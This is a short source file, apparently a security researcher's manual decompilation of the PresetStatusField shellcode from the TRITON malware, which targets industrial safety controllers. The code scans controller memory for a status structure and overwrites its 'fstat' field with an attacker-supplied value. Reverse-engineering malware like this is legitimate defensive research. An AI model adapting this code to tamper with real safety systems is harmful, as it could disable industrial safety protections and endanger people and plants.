/*
	TRITON PresetStatusField reverse-engineered argument-setting shellcode for MPC860EN

	This file is a manual RE decompilation of the TRITON malware PresetStatusField shellcode.
	The shellcode looks for the Control Program (CP) Status structure in memory and sets the 'fstat' field to an attacker-supplied value.
	
	- Jos Wetzels, Midnight Blue (https://www.midnightbluelabs.com), 2018
*/

r2 = 0x800000;

while (true)
{
	if ((uint32_t)*(uint32_t*)(r2) == 0x400000)
	{
		if ((uint32_t)*(uint32_t*)(r2 + 4) == 0x600000)
		{
			r2 += 0x18;
			*(uint32_t*)(r2) = (uint32_t)value;
			break;
		}
	}

	if ((r3 & 0xffffffff) >= 0x800100)
	{
		break;
	}

	r2 += 4;
}

system_call(-1);
